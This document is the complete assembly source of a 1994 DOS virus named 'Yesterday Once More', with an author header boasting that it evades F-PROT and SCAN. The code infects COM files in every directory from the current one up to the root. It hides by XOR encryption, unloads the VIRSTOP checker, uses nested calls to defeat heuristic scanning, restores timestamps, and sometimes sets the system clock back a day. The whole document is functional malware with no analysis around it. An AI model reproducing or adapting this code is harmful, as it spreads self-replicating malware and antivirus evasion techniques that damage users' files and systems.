   ;       YESTERDAY ONCE MORE

   ;       Thanks for Adenine (F-PROT screwing code taken from "Uracil")

   ;       Thanks also go for several other people for helping me in
   ;       several ways..

   ;       Author          : pepper (my first non-overwriting virus!)
   ;       Manufactured in : Finland
   ;       Length          : 529 bytes (YOM.COM = 534bytes, but decrease
   ;                                    5 bytes [mov ax, 4c00h, int 21h])
   ;       Date            : 01-April-94

   ;       Detection       : F-PROT 2.11 doesn't detect this anyhow,
   ;                         with secure or heuristics scan...
   ;                         SCAN 1.13 won't also detect this..

   ;       Information     : *256 different forms of mutation. All the texts
   ;                          and some parts of code are mutated. Number #00
   ;                          of mutations is the unmutated virus.
   ;                         *Infects COM-files, within the length of 123-63999
   ;                         bytes. Doesn't infect command.com.
   ;                         *Uses dotdot-method. Infects 2 files from every
   ;                         directory from current one to root directory.
   ;                         *Checks for previous infection
   ;                         *Restores date and time stamps
   ;                         *Deinits VIRSTOP
   ;                         *Screws F-PROT
   ;                         *Displays 'yesterday once more' every 128th time
   ;                          run and backs up clock by one day...
   ;                         *NOP's are because of that stupid scan thought
   ;                          that this was [Beta] virus.. wellwell..

   ;-------------------------------------------------------------------------

           .MODEL TINY
           .CODE
           org     100h
           assume  cs:@code;ds:@code;es:@code

   duuh:
           nop
           nop
           call    $+8     ; jmp to label BEGIN


   OrigProg:
   mov     ax, 4c00h       ; original proggie, which
   int     21h             ; returns to dos


   begin:

           call    next                            ; find delta offset
   next:   pop     bp
           sub     bp, offset next

           call    decrypt                         ; decrypt virus in
                                                   ; memory

           mov     ax, 4653h

           call    screw_fprot

           mov     bx, 1
           mov     cx, 2
           rep     int 2fh                         ; un-install Virstop..

           mov     ah, 1Ah                         ; function 1A= Set DTA
           nop
           lea     dx, [bp+offset newDTA]
           int     21h                             ; set new dta ds:dx

           mov     ah, 047h
           nop
           mov     dl, 0
           lea     si, [bp+offset dirstring]
           int     021h                            ; Get current directory


   traverse_loop:
   loopx:
           lea     dx, [bp+offset com_spec]        ; filename points to *.COM
           call    infect                          ; find and infect files
           call    toparent                        ; return to ..
                                                   ; returns CF if no '..' found
           jnc loopx                               ; do this until in root dir

   infect_End:

           mov     si, bp
           add     si, Offset OrigProg
           push    sp
           call    screw_fprot
           pop     sp
           mov     di, 0100h
           movsw
           movsw
           nop
           movsb                                   ;Copy original bytes to...

           lea     di, [bp+offset TempShit]        ; TempShit = '\'
           mov     al, 092d
           stosb
           mov     ah, 03bh
           nop
           lea     dx, [bp+offset tempshit]
           int     021h                            ;Return to original directory

           mov     sp, 0FFFEh

           call    setdate

           mov     di, 0100h
           jmp     di

   ToParent:
           mov     ah, 03bh
           lea     dx, [bp+offset dotdot]
           int     021h                            ; change dir to '..'
           ret


   Tempones:
           mov     ax, 3D02h                       ; open file for R/W
           lea     dx, [bp+newDTA+30]              ; DTA ofs 30 = filename
           int     21h
           xchg    ax, bx                          ; file handle to BX

           mov     ah, 3Fh
           mov     cx, 05h
           push    sp
           call    screw_fprot
           pop     sp
           lea     dx, [bp+offset readbuffer]      ; Read 5 bytes from file
           int     21h                             ; to READBUFFER

           mov     ax, 4202h                       ; move file pointer to
           xor     cx, cx                          ; end of the file
           xor     dx, dx
           int     21h                             ; Return new position -> AX
           ret

   infect:
           mov     cx, 020h                        ; Only 'archive' files
           mov     ah, 4Eh                         ; Find First File
           push    sp
           call    screw_fprot
           call    screw_fprot
           pop     sp
           push    sp
           call    screw_fprot
           call    screw_fprot
           pop     sp
           push    sp
           call    screw_fprot
           pop     sp

   findfirstnext:
           int     21h
           jc    bye                               ; jump if carry flag
                                                   ; (CF = ERROR!)
           call  Tempones
           jmp   checks
   backfromcheck:

           mov     ah, 40h                         ; save 5 bytes from READ-
           mov     cx, 05h                         ; BUFFER to the begin of file
           lea     dx, [bp+offset readbuffer]
           int     21h                             ; write 5 bytes

           lea     si, [bp+offset encrypt_val]
           mov     di, si
           lodsb
           inc     al
           stosb
           call    encrypt

           mov     ah, 40h                         ; Copy virus code to the end
           mov     cx, heap-begin                  ; of the file...............
           nop
           lea     dx, [bp+offset begin]           ; cx = byte count,
           int     21h                             ; ds:dx = user buffer

           call    decrypt

           mov     ax, 4200h
           xor     cx, cx                          ; Move file pointer to the
           xor     dx, dx                          ; beginning of the file...
           int     21h                             ; ........................

           mov     CX, Word Ptr [Bp+Offset NewDta+01Ah]
           mov     Word ptr [bp+offset readbuffer], 9090h
           mov     Byte ptr [bp+offset readbuffer+2], 0E8h
           mov     Word ptr [bp+offset readbuffer+3], CX

           mov     ah, 40h                         ; Write jump code to the begin
           mov     cx, 5                           ; of the file...............
           nop
           lea     dx, [bp+offset readbuffer]      ; cx = byte count,
           int     21h                             ; ds:dx = user buffer

           inc     [bp+numinfected]                ; Increase 'infected' counter

   close:
           mov     ax, 5701h
           mov     cx, word ptr [bp+offset newdta+016h] ; set time
           nop
           mov     dx, word ptr [bp+offset newdta+018h] ; set date
           int     021h                            ; reset file time'n date.

           mov     ah, 3Eh                         ; Close File
           int     21h


           cmp     [bp+numinfected], 2
           jae     bye                             ; jump if above or equal
           mov     ah, 4Fh                         ; No, So Find Another File
           jmp     findfirstnext

   bye:
           push    sp
           call    screw_fprot
           pop     sp

           ret

   close2:
           jmp close

   decrypt:
   encrypt:
        mov ah, [bp+encrypt_val]

        mov cx, [offset tempshit - offset com_spec - 2]
           nop
        lea si, [bp+offset com_spec]
        mov di, si

   xor_loop:
        lodsb                 ; DS:[SI] -> AL
        xor al, ah
        stosb                 ; AL -> ES:[DI]
           nop
        loop xor_loop
        ret


   encrypt_val     db      0
   numinfected     db      0                       ; Number Of Files Infected
   DotDot          db      '..',0

   ;ENCRYPTED AREA BEGIN

   com_spec        db      '*.COM',0               ; COM Filespec

   SetDate:
           mov     ah, 1Ah                         ; Function 1Ah=Set DTA
           mov     dx, 80h
           nop
           int     21h                             ; reset old DTA to
                                                   ; DOS' default offset 80h
           push    es
           mov     ax, 040h
           nop
           mov     es, ax
           cmp     byte ptr [ES:6Ch], 02
           pop     es
           jae     EndOfSetDate                    ; Set date just every
                                                   ; 128th time of run..
           mov     ah, 02ah
           int     21h                             ;get date
           cmp     dl, 1                           ;if day = 01.xx.xx, don't set
           je      EndOfSetDate

           dec     dl
           mov     ah, 02bh
           int     21h                             ;set date to original-1
           mov     ah, 09h
           lea     dx, [bp+message]
           int     21h                             ;output message to screen!

   EndOfSetDate:
           ret                                     ;return to to host routine

   checks:
           mov     cx, Word Ptr [bp+offset NewDta+015h]
           and     cx, 031d
           nop
           cmp     cx, 0                           ; files may have only
           jne     close2                          ; archive bit on...

           mov     cx, Word Ptr [bp+offset NewDta+01ah]
           cmp     cx, 64000d
           jae     close2

           cmp     cx, 122d
           jbe     close2

           mov     cl, byte ptr [bp+offset readbuffer+1]
           cmp     cl, 090h
           je      close2                          ; Already Infected

           cmp     word ptr [bp+offset NEWDTA+35], 'DN' ; don't infect
           je      close2                               ; COMMAND.COM

           jmp     backfromcheck

   screw_fprot:
                   jmp  $ + 2                 ;  Nested calls to confuse
                   call screw2                ;  f-protect's heuristic
                   call screw2                ;  analysis
                   call screw2                ;
                   call screw2                ;
           nop
                   call screw2                ;
                   ret                        ;
   screw2:                                    ;
                   jmp  $ + 2                 ;
                   call screw3
                   call screw3
                   call screw3
                   call screw3                ;
                   call screw3                ;
                   ret                        ;
   screw3:                                    ;
                   jmp  $ + 2                 ;
                   call screw4
                   call screw4
                   call screw4                ;
           nop
                   call screw4                ;
                   call screw4                ;
                   ret                        ;
   screw4:                                    ;
                   jmp  $ + 2                 ;
                   ret                        ;
   notshown_msg    db      '[pepper] '
   message         db      'yesterday once more',13,10,'$'

   ;ENCRYPTED AREA END

   TempShit        db      '\'
   heap:
   DirString       db      80h dup (?)             ; original dir is saved here.
   newdta          db      43 dup (?)              ; New Disk Transfer Access
   readbuffer      db      5h dup (?)
   heap_end:
   end duuh
